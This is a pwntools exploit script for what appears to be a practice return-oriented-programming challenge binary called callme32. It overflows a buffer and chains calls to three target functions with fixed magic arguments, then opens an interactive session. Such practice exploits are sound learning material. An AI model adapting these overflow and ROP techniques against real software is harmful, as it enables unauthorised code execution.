#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch="i386")
context.terminal = ["alacritty", "-e", "sh", "-c"]
context.terminal = ["wt.exe", "-w", "0", "nt", "wsl.exe", "--"]
exe = "./callme32"
rop = ROP(exe)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break callme_one
break *0x0804874d
break *callme_one+278
break callme_two
break callme_three
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

io = start()

offset = 44
callme_one = 0x080484F0
callme_two = 0x08048550
callme_three = 0x080484E0
cafebabe = 0xCAFEBABE
deadbeef = 0xDEADBEEF
d00df00d = 0xD00DF00D
pop_gadget = 0x080487F8
main = 0x08048686

pay = flat(
    {
        offset: [
            callme_one,
            pop_gadget,
            deadbeef,
            cafebabe,
            d00df00d,
            p32(0x0),
            callme_two,
            pop_gadget,
            deadbeef,
            cafebabe,
            d00df00d,
            p32(0x0),
            callme_three,
            pop_gadget,
            deadbeef,
            cafebabe,
            d00df00d,
            p32(0x0),
            main,
        ]
    }
)
rop.call("callme_one", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
rop.call("callme_two", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
rop.call("callme_three", [0xDEADBEEF, 0xCAFEBABE, 0xD00DF00D])
# pay = flat({offset: rop.chain()})

io.sendline(pay)

io.interactive()
